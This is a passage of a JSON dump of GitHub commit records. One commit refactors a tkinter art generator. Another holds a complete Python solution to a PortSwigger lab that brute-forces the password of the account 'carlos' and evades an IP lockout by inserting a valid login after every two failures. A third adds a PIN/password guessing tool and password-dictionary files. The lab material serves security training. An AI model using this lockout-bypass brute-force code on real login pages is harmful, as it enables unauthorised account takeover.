get_color_mode_settings(self):\n","add":15,"remove":4,"filename":"\/gui.py","badparts":["        self.draw_mode_settings_entry = {}","            entry = tkinter.Entry(self.draw_mode_options_frame)","            entry.insert(tkinter.END, default_value)","            self.draw_mode_settings_entry[key] = entry"],"goodparts":["        self.draw_mode_settings_values = dict[str, tkinter.Variable]()","            if type == bool:","                value = tkinter.BooleanVar(value=default_value)","                entry = tkinter.Checkbutton(self.draw_mode_options_frame, onvalue=True, offvalue=False, variable=value)","            elif type == float:","                value = tkinter.DoubleVar","                entry = tkinter.Entry(self.draw_mode_options_frame, textvariable=value)","            elif type == int:","                value = tkinter.IntVar(value=default_value)","                entry = tkinter.Entry(self.draw_mode_options_frame, textvariable=value)","            else:","                value = tkinter.StringVar(value=default_value)","                entry = tkinter.Entry(self.draw_mode_options_frame, textvariable=value)","            self.draw_mode_settings_values[key] = value"]},{"diff":"\n         return {\n             key: entry.get()\n             for (key, entry) in\n-            self.draw_mode_settings_entry.items()\n+            self.draw_mode_settings_values.items()\n         }\n \n class DrawUI(tkinter","add":1,"remove":1,"filename":"\/gui.py","badparts":["            self.draw_mode_settings_entry.items()"],"goodparts":["            self.draw_mode_settings_values.items()"]}],"source":"\n\"\"\"Draw Usage: draw_ui.py[options] Options: -h --help Show this screen \"\"\" from __future__ import annotations import random import string import cairo import docopt import tkinter from color_modes import ColorMode from color_modes.cluster import ClusterColorMode from color_modes.invert import InvertColorMode from color_modes.random import RandomColorMode from color_modes.gradient import GradientColorMode from color_modes.sequence import SequenceColorMode from draw_modes import DrawMode from draw_modes.circles import CirclesDrawMode from draw_modes.cluster import ClusterDrawMode from draw_modes.lines import LinesDrawMode from draw_modes.overlapping_circles import OverlappingCirclesDrawMode from draw_modes.splines import SpinesDrawMode from draw_modes.squares import SquaresDrawMode from draw_modes.text import TextDrawMode from draw_modes.triangles import TrianglesDrawMode from models import FloatColor from PIL import Image, ImageTk class OptionsFrame(tkinter.Frame): def __init__(self, *args, **kwargs): super().__init__(*args, **kwargs) tkinter.Label(self, text=\"Colors:\").grid(column=0, row=0) self._color_entry=tkinter.Entry(self) self._color_entry.grid(column=1, row=0) self._color_entry.insert(tkinter.END, \"fff100,ff8c00,e81123,ec008c,68217a,00188f,00bcf2,00b294,009e49,bad80a\") tkinter.Label(self, text=\"Color Mode:\").grid(column=0, row=1) self.color_modes={ x.get_name(): x for x in list[type[ColorMode]]([ GradientColorMode, ClusterColorMode, InvertColorMode, RandomColorMode, SequenceColorMode, ]) } color_mode_keys=list(self.color_modes.keys()) self.current_color_mode_key=tkinter.StringVar(self, color_mode_keys[0]) self.current_color_mode_key.trace_add(\"write\", self._color_mode_changed) self.color_mode_selector=tkinter.OptionMenu(self, self.current_color_mode_key, *color_mode_keys) self.color_mode_selector.grid(column=1, row=1) tkinter.Label(self, text=\"Color Options:\").grid(column=0, row=2, columnspan=2) self.color_mode_options_frame=tkinter.Frame(self) self.color_mode_options_frame.grid(column=0, row=3, columnspan=2) self.color_mode_settings_entry={} tkinter.Label(self, text=\"Draw Mode:\").grid(column=0, row=4) self.draw_modes={ x.get_name(): x for x in list[type[DrawMode]]([ ClusterDrawMode, TrianglesDrawMode, CirclesDrawMode, SquaresDrawMode, LinesDrawMode, SpinesDrawMode, TextDrawMode, OverlappingCirclesDrawMode, ]) } draw_mode_keys=list(self.draw_modes.keys()) self.current_draw_mode_key=tkinter.StringVar(self, draw_mode_keys[0]) self.current_draw_mode_key.trace_add(\"write\", self._draw_mode_changed) self.draw_mode_selector=tkinter.OptionMenu(self, self.current_draw_mode_key, *draw_mode_keys) self.draw_mode_selector.grid(column=1, row=4) tkinter.Label(self, text=\"Draw Options:\").grid(column=0, row=5, columnspan=2) self.draw_mode_options_frame=tkinter.Frame(self) self.draw_mode_options_frame.grid(column=0, row=6, columnspan=2) self.draw_mode_settings_entry={} self._color_mode_changed() self._draw_mode_changed() def get_colors(self) -> list[FloatColor]: return[ FloatColor.from_hex(x) for x in self._color_entry.get().split(',') ] def get_color_mode(self) -> str: return self.current_color_mode_key.get() def get_draw_mode(self) -> str: return self.current_draw_mode_key.get() def _color_mode_changed(self, *args, **kwargs) -> None: children=list(self.color_mode_options_frame.children.values()) for child in children: child.destroy() mode=self.color_modes[self.get_color_mode()] self.color_mode_settings_entry={} count=0 for(key,(name, type, default_value)) in mode.get_option_types().items(): label=tkinter.Label(self.color_mode_options_frame, text=name) label.grid(row=count, column=0) entry=tkinter.Entry(self.color_mode_options_frame) entry.grid(row=count, column=1) entry.insert(tkinter.END, default_value) self.color_mode_settings_entry[key]=entry count=count +1 def _draw_mode_changed(self, *args, **kwargs) -> None: children=list(self.draw_mode_options_frame.children.values()) for child in children: child.destroy() mode=self.draw_modes[self.get_draw_mode()] self.draw_mode_settings_entry={} count=0 for(key,(name, type, default_value)) in mode.get_option_types().items(): label=tkinter.Label(self.draw_mode_options_frame, text=name) label.grid(row=count, column=0) entry=tkinter.Entry(self.draw_mode_options_frame) entry.grid(row=count, column=1) entry.insert(tkinter.END, default_value) self.draw_mode_settings_entry[key]=entry count=count +1 def get_color_mode_settings(self): return{ key: entry.get() for(key, entry) in self.color_mode_settings_entry.items() } def get_draw_mode_settings(self): return{ key: entry.get() for(key, entry) in self.draw_mode_settings_entry.items() } class DrawUI(tkinter.Tk): def __init__(self, *args, **kwargs): super().__init__(*args, **kwargs) self.width, self.height=1024, 1024 self.geometry(\"{}x{}\".format(self.width +50, self.height +50)) self.surface=cairo.ImageSurface(cairo.FORMAT_ARGB32, self.width, self.height) self.context=cairo.Context(self.surface) self.image:tkinter.Label=None self._clear_image() self.generate_button=tkinter.Button(self, text=\"Generate\", command=self.draw) self.generate_button.grid(column=0, row=0) self.options_button=tkinter.Button(self, text=\"Options\", command=self.toggle_options) self.options_button.grid(column=1, row=0) tkinter.Button(self, text=\"Clear\", command=self._clear_image).grid(column=2, row=0) tkinter.Button(self, text=\"Save\", command=self._save_image).grid(column=3, row=0) self._options=OptionsFrame(self) self._options.grid(column=0, row=1, columnspan=10) self._options.grid_remove() def toggle_options(self): if len(self._options.grid_info())==0: self._options.grid() else: self._options.grid_remove() def _clear_image(self): self.surface=cairo.ImageSurface(cairo.FORMAT_ARGB32, self.width, self.height) self.context=cairo.Context(self.surface) self._set_image() def _set_image(self): self._image_ref=ImageTk.PhotoImage(Image.frombuffer(\"RGBA\",(self.width, self.height), self.surface.get_data().tobytes(), \"raw\", \"BGRA\", 0, 1)) self.image=tkinter.Label(self, image=self._image_ref) self.image.grid(column=0, row=2, columnspan=10, rowspan=9) def draw(self): if self.image: self.image.destroy() self.context.set_operator(cairo.Operator.OVER) color_mode_key=self._options.get_color_mode() color_mode_class=self._options.color_modes[color_mode_key] color_mode=color_mode_class(self._options.get_colors(), **self._options.get_color_mode_settings(), context=self.context) draw_mode_key=self._options.get_draw_mode() draw_mode_class=self._options.draw_modes[draw_mode_key] draw_mode=draw_mode_class(**self._options.get_draw_mode_settings()) draw_mode.draw( self.context, color_mode, self.width, self.height, ) self._set_image() def _save_image(self): color_mode=self._options.get_color_mode() draw_mode=self._options.get_draw_mode() suffix=''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(8)) self.surface.write_to_png(f\"generated\/{color_mode}_{draw_mode}_{suffix}.png\") def main(): arguments=docopt.docopt(__doc__, version='v0.0.0') window=DrawUI() window.mainloop() if __name__=='__main__': main() ","sourceWithComments":"\"\"\"Draw\n\nUsage:\n  draw_ui.py [options]\n\nOptions:\n  -h --help                   Show this screen\n\n\"\"\"\nfrom __future__ import annotations\n\nimport random\nimport string\nimport cairo\nimport docopt\nimport tkinter\n\nfrom color_modes import ColorMode\nfrom color_modes.cluster import ClusterColorMode\nfrom color_modes.invert import InvertColorMode\nfrom color_modes.random import RandomColorMode\nfrom color_modes.gradient import GradientColorMode\nfrom color_modes.sequence import SequenceColorMode\n\nfrom draw_modes import DrawMode\nfrom draw_modes.circles import CirclesDrawMode\nfrom draw_modes.cluster import ClusterDrawMode\nfrom draw_modes.lines import LinesDrawMode\nfrom draw_modes.overlapping_circles import OverlappingCirclesDrawMode\nfrom draw_modes.splines import SpinesDrawMode\nfrom draw_modes.squares import SquaresDrawMode\nfrom draw_modes.text import TextDrawMode\nfrom draw_modes.triangles import TrianglesDrawMode\n\nfrom models import FloatColor\n\nfrom PIL import Image, ImageTk\n\nclass OptionsFrame(tkinter.Frame):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n\n        # Row 0\n        tkinter.Label(self, text=\"Colors:\").grid(column=0, row=0)\n        self._color_entry = tkinter.Entry(self)\n        self._color_entry.grid(column=1, row=0)\n        self._color_entry.insert(tkinter.END, \"fff100,ff8c00,e81123,ec008c,68217a,00188f,00bcf2,00b294,009e49,bad80a\")\n\n        # Row 1\n        tkinter.Label(self, text=\"Color Mode:\").grid(column=0, row=1)\n        self.color_modes = {\n            x.get_name(): x for x in list[type[ColorMode]]([\n                GradientColorMode,\n                ClusterColorMode,\n                InvertColorMode,\n                RandomColorMode,\n                SequenceColorMode,\n            ])\n        }\n        color_mode_keys = list(self.color_modes.keys())\n        self.current_color_mode_key = tkinter.StringVar(self, color_mode_keys[0])\n        self.current_color_mode_key.trace_add(\"write\", self._color_mode_changed)\n        self.color_mode_selector = tkinter.OptionMenu(self, self.current_color_mode_key, *color_mode_keys)\n        self.color_mode_selector.grid(column=1, row=1)\n\n        # Row 2\n        tkinter.Label(self, text=\"Color Options:\").grid(column=0, row=2, columnspan=2)\n\n        # Row 3\n        self.color_mode_options_frame = tkinter.Frame(self)\n        self.color_mode_options_frame.grid(column=0, row=3, columnspan=2)\n        self.color_mode_settings_entry = {}\n\n        # Row 4\n        tkinter.Label(self, text=\"Draw Mode:\").grid(column=0, row=4)\n        self.draw_modes = {\n            x.get_name(): x for x in list[type[DrawMode]]([\n                ClusterDrawMode,\n                TrianglesDrawMode,\n                CirclesDrawMode,\n                SquaresDrawMode,\n                LinesDrawMode,\n                SpinesDrawMode,\n                TextDrawMode,\n                OverlappingCirclesDrawMode,\n            ])\n        }\n        draw_mode_keys = list(self.draw_modes.keys())\n        self.current_draw_mode_key = tkinter.StringVar(self, draw_mode_keys[0])\n        self.current_draw_mode_key.trace_add(\"write\", self._draw_mode_changed)\n        self.draw_mode_selector = tkinter.OptionMenu(self, self.current_draw_mode_key, *draw_mode_keys)\n        self.draw_mode_selector.grid(column=1, row=4)\n\n        # Row 5\n        tkinter.Label(self, text=\"Draw Options:\").grid(column=0, row=5, columnspan=2)\n\n        # Row 6\n        self.draw_mode_options_frame = tkinter.Frame(self)\n        self.draw_mode_options_frame.grid(column=0, row=6, columnspan=2)\n        self.draw_mode_settings_entry = {}\n\n        # Finalize\n        self._color_mode_changed()\n        self._draw_mode_changed()\n\n    def get_colors(self) -> list[FloatColor]:\n        return [\n            FloatColor.from_hex(x) for x in self._color_entry.get().split(',')\n        ]\n\n    def get_color_mode(self) -> str:\n        return self.current_color_mode_key.get()\n\n    def get_draw_mode(self) -> str:\n        return self.current_draw_mode_key.get()\n\n    def _color_mode_changed(self, *args, **kwargs) -> None:\n        children = list(self.color_mode_options_frame.children.values())\n        for child in children:\n            child.destroy()\n\n        mode = self.color_modes[self.get_color_mode()]\n        self.color_mode_settings_entry = {}\n\n        count = 0\n        for (key, (name, type, default_value)) in mode.get_option_types().items():\n            label = tkinter.Label(self.color_mode_options_frame, text=name)\n            label.grid(row=count, column=0)\n            entry = tkinter.Entry(self.color_mode_options_frame)\n            entry.grid(row=count, column=1)\n            entry.insert(tkinter.END, default_value)\n\n            self.color_mode_settings_entry[key] = entry\n            count = count + 1\n\n    def _draw_mode_changed(self, *args, **kwargs) -> None:\n        children = list(self.draw_mode_options_frame.children.values())\n        for child in children:\n            child.destroy()\n\n        mode = self.draw_modes[self.get_draw_mode()]\n        self.draw_mode_settings_entry = {}\n\n        count = 0\n        for (key, (name, type, default_value)) in mode.get_option_types().items():\n            label = tkinter.Label(self.draw_mode_options_frame, text=name)\n            label.grid(row=count, column=0)\n            entry = tkinter.Entry(self.draw_mode_options_frame)\n            entry.grid(row=count, column=1)\n            entry.insert(tkinter.END, default_value)\n\n            self.draw_mode_settings_entry[key] = entry\n            count = count + 1\n\n    def get_color_mode_settings(self):\n        return {\n            key: entry.get()\n            for (key, entry) in\n            self.color_mode_settings_entry.items()\n        }\n\n    def get_draw_mode_settings(self):\n        return {\n            key: entry.get()\n            for (key, entry) in\n            self.draw_mode_settings_entry.items()\n        }\n\nclass DrawUI(tkinter.Tk):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.width, self.height = 1024, 1024\n\n        self.geometry(\"{}x{}\".format(self.width + 50, self.height + 50))\n\n        self.surface = cairo.ImageSurface(cairo.FORMAT_ARGB32, self.width, self.height)\n        self.context = cairo.Context(self.surface)\n        self.image:tkinter.Label = None\n\n        self._clear_image()\n\n        self.generate_button = tkinter.Button(self, text=\"Generate\", command=self.draw)\n        self.generate_button.grid(column=0, row=0)\n\n        self.options_button = tkinter.Button(self, text=\"Options\", command=self.toggle_options)\n        self.options_button.grid(column=1, row=0)\n\n        tkinter.Button(self, text=\"Clear\", command=self._clear_image).grid(column=2, row=0)\n        tkinter.Button(self, text=\"Save\", command=self._save_image).grid(column=3, row=0)\n\n        self._options = OptionsFrame(self)\n        self._options.grid(column=0, row=1, columnspan=10)\n        self._options.grid_remove()\n\n    def toggle_options(self):\n        if len(self._options.grid_info()) == 0:\n            self._options.grid()\n        else:\n            self._options.grid_remove()\n\n    def _clear_image(self):\n        self.surface = cairo.ImageSurface(cairo.FORMAT_ARGB32, self.width, self.height)\n        self.context = cairo.Context(self.surface)\n\n        self._set_image()\n\n    def _set_image(self):\n        self._image_ref = ImageTk.PhotoImage(Image.frombuffer(\"RGBA\", (self.width, self.height), self.surface.get_data().tobytes(), \"raw\", \"BGRA\", 0, 1))\n        self.image = tkinter.Label(self, image=self._image_ref)\n        self.image.grid(column=0, row=2, columnspan=10, rowspan=9)\n\n    def draw(self):\n        if self.image:\n            self.image.destroy()\n\n        # Reset the operator, it case something changed it (invert....)\n        self.context.set_operator(cairo.Operator.OVER)\n\n        color_mode_key = self._options.get_color_mode()\n        color_mode_class = self._options.color_modes[color_mode_key]\n\n        color_mode = color_mode_class(self._options.get_colors(), **self._options.get_color_mode_settings(), context=self.context)\n\n        draw_mode_key = self._options.get_draw_mode()\n        draw_mode_class = self._options.draw_modes[draw_mode_key]\n\n        draw_mode = draw_mode_class(**self._options.get_draw_mode_settings())\n\n        draw_mode.draw(\n            self.context,\n            color_mode,\n            self.width,\n            self.height,\n        )\n\n        self._set_image()\n\n    def _save_image(self):\n        color_mode = self._options.get_color_mode()\n        draw_mode = self._options.get_draw_mode()\n        suffix = ''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(8))\n        self.surface.write_to_png(f\"generated\/{color_mode}_{draw_mode}_{suffix}.png\")\n\ndef main():\n    arguments = docopt.docopt(__doc__, version='v0.0.0')\n    window = DrawUI()\n    window.mainloop()\n\nif __name__ == '__main__':\n    main()\n"}},"msg":"Update clustering modes\n\nUpdated clustering modes to use binary tree search rather than brute\nforcing"}},"https:\/\/github.com\/AymanRbati\/appsec-scripts":{"1e9c244ab70e0585aafd6ade628afef3f8cf1a67":{"url":"https:\/\/api.github.com\/repos\/AymanRbati\/appsec-scripts\/commits\/1e9c244ab70e0585aafd6ade628afef3f8cf1a67","html_url":"https:\/\/github.com\/AymanRbati\/appsec-scripts\/commit\/1e9c244ab70e0585aafd6ade628afef3f8cf1a67","message":"Update bypassing-broken-brute-force-protection.py","sha":"1e9c244ab70e0585aafd6ade628afef3f8cf1a67","keyword":"brute force update","diff":"diff --git a\/bypassing-broken-brute-force-protection.py b\/bypassing-broken-brute-force-protection.py\nindex 8567901..146e053 100644\n--- a\/bypassing-broken-brute-force-protection.py\n+++ b\/bypassing-broken-brute-force-protection.py\n@@ -2,7 +2,12 @@\n import sys\n import time\n \n-url=\"https:\/\/0af9008203834e85c0f6bc59002c004b.web-security-academy.net\/login\"\n+# this is a solution i made for the portswigger lab https:\/\/portswigger.net\/web-security\/authentication\/password-based\/lab-broken-bruteforce-protection-ip-block\n+# basically, doing a succesful authentication resets blacklist counter.\n+# so we can do two failed attempts and a successfull one (with the credentials that they gave us wiener:peter)\n+# based on this, we can perform a bruteforce attack\n+\n+url=\"https:\/\/vulnerableapp.com\/login\"\n username = \"wiener\"\n proxies = {'http': 'http:\/\/127.0.0.1:8080'}\n \n","files":{"\/bypassing-broken-brute-force-protection.py":{"changes":[{"diff":"\n import sys\n import time\n \n-url=\"https:\/\/0af9008203834e85c0f6bc59002c004b.web-security-academy.net\/login\"\n+# this is a solution i made for the portswigger lab https:\/\/portswigger.net\/web-security\/authentication\/password-based\/lab-broken-bruteforce-protection-ip-block\n+# basically, doing a succesful authentication resets blacklist counter.\n+# so we can do two failed attempts and a successfull one (with the credentials that they gave us wiener:peter)\n+# based on this, we can perform a bruteforce attack\n+\n+url=\"https:\/\/vulnerableapp.com\/login\"\n username = \"wiener\"\n proxies = {'http': 'http:\/\/127.0.0.1:8080'}\n \n","add":6,"remove":1,"filename":"\/bypassing-broken-brute-force-protection.py","badparts":["url=\"https:\/\/0af9008203834e85c0f6bc59002c004b.web-security-academy.net\/login\""],"goodparts":["url=\"https:\/\/vulnerableapp.com\/login\""]}],"source":"\nimport requests import sys import time url=\"https:\/\/0af9008203834e85c0f6bc59002c004b.web-security-academy.net\/login\" username=\"wiener\" proxies={'http': 'http:\/\/127.0.0.1:8080'} try: def bruteCracking(username,url): count=0 data_dict=\"username=wiener&password=peter\" response=requests.post(url, data=data_dict, proxies=proxies) while(\"too many incorrect login attempts\") in str(response.text): print(\"IP blocked ! retrying the bruteforce after one minute\") print(response.text) time.sleep(60) response=requests.post(url, data=data_dict, proxies=proxies) for password in passwords: password=password.strip() count=count +1 if(count==2): data_dict=\"username=wiener&password=peter\" response=requests.post(url, data=data_dict, proxies=proxies) count=0 pass print(\"Trying Password: \"+password) data_dict=\"username=carlos&password=\"+password response=requests.post(url, data=data_dict, proxies=proxies) if \"Incorrect password\" in str(response.text): pass if \"carlos\" in str(response.text): print(\"the correct password is: \" +password) sys.exit() except: print(\"Some Error Occurred Please Check Your Internet Connection !!\") with open(\"passwords.txt\", \"r\") as passwords: bruteCracking(username,url) ","sourceWithComments":"import requests\nimport sys\nimport time\n\nurl=\"https:\/\/0af9008203834e85c0f6bc59002c004b.web-security-academy.net\/login\"\nusername = \"wiener\"\nproxies = {'http': 'http:\/\/127.0.0.1:8080'}\n\n\ntry: \n    def bruteCracking(username,url):\n        count = 0\n        data_dict = \"username=wiener&password=peter\"\n        response = requests.post(url, data=data_dict, proxies=proxies)\n        while(\"too many incorrect login attempts\") in str(response.text):\n            print(\"IP blocked ! retrying the bruteforce after one minute\")\n            print(response.text)\n            time.sleep(60)\n            response = requests.post(url, data=data_dict, proxies=proxies)\n        for password in passwords:\n            password = password.strip()\n            count = count + 1\n            if(count == 2 ):\n                data_dict = \"username=wiener&password=peter\"\n                response = requests.post(url, data=data_dict, proxies=proxies)\n                count=0\n                pass\n            print(\"Trying Password: \"+ password)\n            data_dict = \"username=carlos&password=\"+password\n            response = requests.post(url, data=data_dict, proxies=proxies)\n            if \"Incorrect password\" in str(response.text):\n                pass\n            if \"carlos\" in str(response.text):\n                print(\"the correct password is :  \" + password)\n                sys.exit()\n                    \nexcept:\n    print(\"Some Error Occurred Please Check Your Internet Connection !!\")\n\nwith open(\"passwords.txt\", \"r\") as passwords:\n    bruteCracking(username,url)\n\n\n"}},"msg":"Update bypassing-broken-brute-force-protection.py"}},"https:\/\/github.com\/yonasuriv\/MGK":{"d2be35d8f12101d977dac148369810217e625b54":{"url":"https:\/\/api.github.com\/repos\/yonasuriv\/MGK\/commits\/d2be35d8f12101d977dac148369810217e625b54","html_url":"https:\/\/github.com\/yonasuriv\/MGK\/commit\/d2be35d8f12101d977dac148369810217e625b54","sha":"d2be35d8f12101d977dac148369810217e625b54","keyword":"brute force change","diff":"diff --git a\/.BruteForce.py b\/.BruteForce.py\nindex 45f2e4d..ff1543a 100644\n--- a\/.BruteForce.py\n+++ b\/.BruteForce.py\n@@ -8,18 +8,92 @@\n # Usefull for PIN Cracking# For string module documentation: https:\/\/docs.python.org\/3\/library\/string.html\n import string\n \n-chars = string.printable[:10] # :95 for the full characters list\n+# We import time module for the function sleep\n+import time\n+\n+menu_options = {\n+    1: 'Digits (Default)            [0123456789]',\n+    2: 'HEX Digits                  [0123456789abcdefABCDEF]',\n+    3: 'Lowercase letters           [abcdefghijklmnopqrstuvwxyz]',\n+    4: 'Uppercase letters           [ABCDEFGHIJKLMNOPQRSTUVWXYZ]',\n+    5: 'All letters                 [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]',\n+    6: 'All numbers and letters     [0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]',\n+    7: 'All possible characters     [digits, letters, punctuation and whitespace]',   \n+}\n+\n+def print_menu():\n+    for key in menu_options.keys():\n+        print (key, '--', menu_options[key] )\n+\n+print_menu()\n+\n+if __name__=='__main__':\n+    while(True):\n+        try:\n+            print ()\n+            print(' Below you will be asked to select the type of characters that you want to include in the attack.')\n+            print(' Have in mind that selecting a password outside the character range will end in a infinite shooting without success.')\n+            print()\n+            option = int(input('Select your bullets (char type): '))\n+        except:\n+            print('Wrong input. Please enter a number ...')\n+        # Check what choice was entered and act accordingly\n+        if option == 1:\n+            chars = string.digits\n+            print()\n+            print('You selected DIGITS Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        elif option == 2:\n+            chars = string.hexdigits\n+            print()\n+            print('You selected HEXDIGITS Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        elif option == 3:\n+            chars = string.ascii_lowercase\n+            print()\n+            print('You selected LOWERCASE Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        elif option == 4:\n+            chars = string.ascii_uppercase\n+            print()\n+            print('You selected UPPERCASE Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        elif option == 5:\n+            chars = string.ascii_letters\n+            print()\n+            print('You selected ABECEDARY Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        elif option == 6:\n+            chars = string.printable[:62]\n+            print()\n+            print('You selected ARMOR-PIERCING Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        elif option == 7:\n+            chars = string.printable[:95]\n+            print()\n+            print('You selected GODKILLER Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        else:\n+            chars = string.digits\n+            print('Invalid option. Running Default Mode (PIN Cracker).')\n+            break\n+\n chars_list = list(chars)\n \n password = pyautogui.password(\"Enter a PIN\/Password: \")\n guess_password = \"\"\n+print()\n+print(\"Preparing to launch the bullets rain..\")\n+time.sleep(3)\n \n while(guess_password != password):\n \tguess_password = random.choices(chars_list, k=len(password))\n-\tprint(\"<===========\"+ str(guess_password) + \"===========>\")\n+\tprint(\"\ufe3b\u2566\u0335\u0335\u0347\u033f\u033f\u033f\u033f\u2564\u2500\u2500\"+ \"   \" + str(guess_password))\n \n \tif(guess_password == list(password)):\n \t\tprint(\"Your PIN\/Password is: \" + \"\".join(guess_password))\n \t\tbreak\n \t\texit\n \n+\n+\ndiff --git a\/.FileSplitter.sh b\/.FileSplitter.sh\nindex 12e6213..e03b239 100644\n--- a\/.FileSplitter.sh\n+++ b\/.FileSplitter.sh\n@@ -6,14 +6,14 @@ sleep 3\n echo\n echo \" Please have in mind a few things:\"\n echo \"\"\n-echo \" 1) $red Your Passwords TXT File should be under the directory DICTIONARY. $end\"\n-echo \" 1) $red FILE NAME should be EXACT. $end\"\n-echo \" 2) $red You don't have to write the extension, as for the moment the script ONLY suport .TXT files. $end\"\n+echo \" 1) $green2 Your passwords file should be under the directory 'Passwords Atlas'. $end\"\n+echo \" 1) $green2 When writting the file name, it should be EXACT.. $end\"\n+echo \" 2) $green2 You don't have to write the extension, as for the moment the script ONLY suport .TXT files. $end\"\n echo\n sleep 3\n-echo \" If the file get splitted succesfully, you should see something similar to this:$white xaa$end,$white xab$end,$white xac$end,$white xad$end,$white xae$end...$white xagsr$end,$white xagso$end,$white xagsp$end,$white xagsq$end, etc.\"\n+echo \" If the file get splitted succesfully, you should see something similar to this:$green xaa$end,$green xab$end,$green xac$end,$green xad$end,$green xae$end...$green xagsr$end,$green xagso$end,$green xagsp$end,$green xagsq$end, etc.\"\n echo \n-echo \"$yellow Enter the name of the file you want split: $end\"\n+echo \"$yellow2 Enter the name of the file you want split: $end\"\n echo\n read fileName\n echo\n@@ -22,5 +22,5 @@ echo\n read fileLines\n echo\n \n-cd Dictionary\n+cd 'Passwords Atlas'\n split $fileName.txt -l $fileLines\ndiff --git a\/MGK.sh b\/MGK.sh\nindex bfa3a1c..ae03af1 100644\n--- a\/MGK.sh\n+++ b\/MGK.sh\n@@ -31,7 +31,7 @@ read selection\n echo\n case $selection in\n   1) python3 .Dictionary.py; credits;;\n-  2) python3 .BruteForcek.py ; credits;;\n+  2) python3 .BruteForce.py ; credits;;\n   3) python3 .HASHGEN.py;;\n   4) sh .FileSplitter.sh;;\n   5) python3 .addpwd.py ; credits;;\ndiff --git a\/Password Atlas\/File Spliter\/.shcss.sh b\/Password Atlas\/File Spliter\/.shcss.sh\ndeleted file mode 100644\nindex 200393a..0000000\n--- a\/Password Atlas\/File Spliter\/.shcss.sh\t\n+++ \/dev\/null\n@@ -1,96 +0,0 @@\n-## - ASCII Banner Generators\n-## https:\/\/manytools.org\/hacker-tools\/ascii-banner\/ -> Uses the excellent FIGlet JS by patorjk https:\/\/patorjk.com\/software\/taag\/\n-##\n-## - Global Color Configuration\n-## To add an style, simply put $style before the desired text and finish with $end\n-## echo There are so many $negative negative $end people in the world, some of them wana see the world$red burn $end\n-##\n-## - Importing color variables\n-## Copy the code below to the beggining of your script. (both files have to be in the same directory)\n-## '. .\/shcss.sh'\n-##\n-## - Showing colors in the terminal before putting them in your Script\n-## Just uncomment the line of code at the end of this script and run 'sh colors.sh' in the terminal\n-\n-end=\"\\033[0m\"\n-bold=\"\\033[1m\"\n-underline=\"\\033[4m\"\n-blink=\"\\033[5m\"\n-negative=\"\\033[7m\"\n-striket=\"\\033[9m\"\n-grey=\"\\033[0;30m\"\n-white=\"\\033[0;37m\"\n-white2=\"\\033[1;37m\"\n-red=\"\\033[0;31m\"\n-red2=\"\\033[1;31m\"\n-green=\"\\033[0;32m\"\n-green2=\"\\033[1;32m\"\n-yellow=\"\\033[0;33m\"\n-yellow2=\"\\033[1;33m\"\n-blue=\"\\033[0;34m\"\n-blue2=\"\\033[1;34m\"\n-purple=\"\\033[0;35m\"\n-purple2=\"\\033[1;35m\"\n-cyan=\"\\033[0;36m\"\n-cyan2=\"\\033[1;36m\"\n-redbg=\"\\033[1;37;41m\"\n-greenbg=\"\\033[1;37;42m\"\n-yellowbg=\"\\033[1;37;43m\"\n-bluebg=\"\\033[1;37;44m\"\n-purplebg=\"\\033[1;37;45m\"\n-cyanbg=\"\\033[1;37;46m\"\n-whitebg=\"\\033[1;37;47m\"\n-greybgred=\"\\033[1;31;40m\"\n-greybggreen=\"\\033[1;32;40m\"\n-greybgyellow=\"\\033[1;33;40m\"\n-greybgblue=\"\\033[1;34;40m\"\n-greybgpurple=\"\\033[1;35;40m\"\n-greybgcyan=\"\\033[1;36;40m\"\n-greybgwhite=\"\\033[1;37;40m\"\n-\n-show_colors () {\n-clear\n-echo \"\"\"\n- \\033[1m Bold\\033[0m\n-  \\033[4mUnderline\\033[0m\n- \\033[5m Blink \\033[0m\n- \\033[7m Negative \\033[0m\n-  \\033[9mStrikethrough\\033[0m\n- \\033[0;30m Text color Grey \\033[0m\n- \\033[0;37m Text color White \\033[0m\n- \\033[1;37m Text color White Bright \\033[0m\n- \\033[0;31m Text color Red \\033[0m\n- \\033[1;31m Text color Red Bright \\033[0m\n- \\033[0;32m Text color Green \\033[0m\n- \\033[1;32m Text color Green Bright \\033[0m\n- \\033[0;33m Text color Yellow \\033[0m\n- \\033[1;33m Text color Yellow Bright \\033[0m\n- \\033[0;34m Text color Blue \\033[0m\n- \\033[1;34m Text color Blue Bright \\033[0m\n- \\033[0;35m Text color Purple \\033[0m\n- \\033[1;35m Text color Purple Bright \\033[0m\n- \\033[0;36m Text color Cyan \\033[0m\n- \\033[1;36m Text color Cyan Bright \\033[0m\n- \\033[1;37;41m Background Red \\033[0m\n- \\033[1;37;42m Background Green \\033[0m\n- \\033[1;37;43m Background Yellow \\033[0m\n- \\033[1;37;44m Background Blue \\033[0m\n- \\033[1;37;45m Background Magenta \\033[0m\n- \\033[1;37;46m Background Cyan \\033[0m\n- \\033[1;30;47m Background White \\033[0m\n- \\033[1;31;40m Background Grey with Red Text \\033[0m\n- \\033[1;32;40m Background Grey with Green Text \\033[0m\n- \\033[1;33;40m Background Grey with Yellow Text \\033[0m\n- \\033[1;34;40m Background Grey with Blue Text \\033[0m\n- \\033[1;35;40m Background Grey with Purple Cyan Text \\033[0m\n- \\033[1;36;40m Background Grey with Cyan Text \\033[0m\n- \\033[1;37;40m Background Grey with White Text \\033[0m\n-\"\"\"\n-}\n-\n-## - Unmark the line below here to print all colors available in the console\n-\n-#show_colors\n-\n-\n-\ndiff --git a\/Password Atlas\/V2.Human-Only.torrent b\/Passwords Atlas\/Dictionary Downloads\/V2.Human-Only.torrent\nsimilarity index 100%\nrename from Password Atlas\/V2.Human-Only.torrent\nrename to Passwords Atlas\/Dictionary Downloads\/V2.Human-Only.torrent\ndiff --git a\/Password Atlas\/V3.Arsenal-90.torrent b\/Passwords Atlas\/Dictionary Downloads\/V3.Arsenal-90.torrent\nsimilarity index 